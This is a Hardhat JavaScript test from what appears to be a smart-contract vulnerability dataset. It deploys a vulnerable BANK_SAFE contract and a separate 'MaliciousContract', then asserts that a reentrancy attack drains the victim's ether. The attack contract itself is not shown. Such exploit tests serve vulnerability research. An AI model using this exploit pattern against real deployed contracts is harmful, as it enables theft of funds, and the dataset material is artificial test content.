const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("Reentrancy Attack for 0x561eac93c92360949ab1f1403323e6db345cbf31.sol", function () {  
    let BANK_SAFE;
    let victim;
    let MaliciousContract;
    let hacker;
    let Log;
    let log;

    beforeEach(async function () {
        // Deploy Log contract
        Log = await ethers.getContractFactory("contracts/dataset/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.sol:LogFile");
        log = await Log.deploy();
        await log.waitForDeployment();

        // Deploy BANK_SAFE contract with Log address
        BANK_SAFE = await ethers.getContractFactory("contracts/dataset/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31.sol:BANK_SAFE");
        victim = await BANK_SAFE.deploy();
        await victim.waitForDeployment();
        await victim.SetLogFile(log.target); // Set Log address after deployment

        // Deploy MaliciousContract with BANK_SAFE address
        MaliciousContract = await ethers.getContractFactory("contracts/reentrancy/0x561eac93c92360949ab1f1403323e6db345cbf31_attack.sol:MaliciousContract");
        hacker = await MaliciousContract.deploy(victim.target);
        
    });

    it("should successfully drain funds through reentrancy attack", async function () {
        // Initial deposit to victim contract
        await victim.Deposit( {value: ethers.parseEther("5") });

        const victimInitialBalance = await ethers.provider.getBalance(victim.target);
        expect(victimInitialBalance).to.equal(ethers.parseEther("5")); 


        // Initial deposit from maliciousContract on victim contract
        await hacker.deposit({value:  ethers.parseEther("3")});

        const victimBalanceAfterDeposit = await ethers.provider.getBalance(victim.target);
        expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("8")); 


        // Perform reentrancy attack through MaliciousContract
        await hacker.attack(ethers.parseEther("2"));
        
        // Check balances after attack
        const victimBalance = await ethers.provider.getBalance(victim.target);
        const maliciousContractBalance = await ethers.provider.getBalance(hacker.target);

        // Verify the attack was successful
        
        // victim has a drained account
        expect(victimBalance).to.be.below(ethers.parseEther("6")); 

        // 5 original balance + 3 from hacker initial deposit 
        expect(maliciousContractBalance).to.be.above(ethers.parseEther("2"));
        
    });
    });
  